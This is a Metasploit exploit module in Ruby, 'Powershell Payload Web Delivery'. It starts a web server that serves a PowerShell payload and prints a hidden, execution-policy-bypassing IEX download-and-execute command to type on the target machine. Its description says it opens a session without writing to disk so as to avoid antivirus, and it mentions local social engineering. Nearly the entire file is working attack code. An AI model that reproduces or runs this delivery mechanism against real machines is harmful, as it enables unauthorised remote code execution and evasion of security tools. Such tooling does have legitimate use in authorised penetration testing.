# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'     => 'Powershell Payload Web Delivery',
      'Description'   => %q{
        This module quickly fires up a web server that serves the payload in powershell.
        The provided command will start powershell and then download and execute the
        payload. The IEX command can also be extracted to execute directly from powershell.
        The main purpose of this module is to quickly establish a session on a target
        machine when the attacker has to manually type in the command himself, e.g. RDP
        Session, Local Access or maybe Remote Command Exec. This attack vector does not
        write to disk so is unlikely to trigger AV solutions and will allow to attempt local
        social engineering. Ensure the payload architecture matches the target computer or
        use SYSWOW64 powershell.exe to execute x86 payloads on x64 machines.
      },
      'License'   => MSF_LICENSE,
      'Author'   =>
        [
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
          'Chris Campbell' #@obscuresec - Inspiration n.b. no relation!
        ],
      'References'   =>
        [
          [ 'URL', 'http://www.pentestgeek.com/2013/07/19/invoke-shellcode/' ],
          [ 'URL', 'http://www.powershellmagazine.com/2013/04/19/pstip-powershell-command-line-switches-shortcuts/'],
          [ 'URL', 'http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html']
        ],
      'Platform'   => 'win',
      'Targets'   =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 19 2013'))
  end

  def on_request_uri(cli, request)
    print_status("Delivering Payload")
    data = Msf::Util::EXE.to_win32pe_psh_net(framework, payload.encoded)
    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
  end

  def primer
    url = get_uri()
    download_and_run = "IEX ((new-object net.webclient).downloadstring('#{url}'))"
    print_status("Run the following command on the target machine:")
    print_line("powershell.exe -w hidden -nop -ep bypass -c \"#{download_and_run}\"")
  end
end

